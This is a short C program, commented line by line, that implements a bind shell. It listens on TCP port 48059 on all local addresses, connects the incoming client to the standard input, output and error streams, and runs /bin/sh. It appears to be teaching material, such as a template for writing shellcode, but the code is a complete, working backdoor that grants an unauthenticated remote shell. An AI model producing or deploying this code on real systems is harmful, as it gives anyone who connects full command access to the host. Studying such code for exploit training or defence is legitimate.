#include <sys/socket.h>                                         // libraries used to make a socket
#include <netinet/in.h>                                         // defines the sockaddr structure

int main()
{
    char * shell[2];                                            // prep for execve call
    int server, client;                                         // file descriptor handles
    struct sockaddr_in serv_addr;                               // structure to hold IP/port values
    
    server = socket(2, 1, 0);                                   // build a local IP socket of type stream
    serv_addr.sin_addr.s_addr = 0;                               // set addresses if socket to all local
    serv_addr.sin_port=0xBBBB;                                  // set port of socket, 48059 here
    serv_addr.sin_family = 2;                                   // set native protocol family: IP
    bind(server, (struct sockaddr *) &serv_addr, 0x10);         // bind socket
    listen(server,0);                                           // enter listen state, wait for connect
    client = accept(server, 0, 0);                              // when connect, return client handles
    
    /* connect client pipes to stdin, stdout, stderr */
    
    dup2(client, 0);                                            // connect stdin to client
    dup2(client, 1);                                            // connect stdout to client
    dup2(client, 2);                                            // connect stderr to client
    shell[0] = "/bin/sh";                                       // first argument of execve
    shell[1] = 0;                                               // terminate array with null
    execve(shell[0], shell, 0);                                 // pop a shell
}
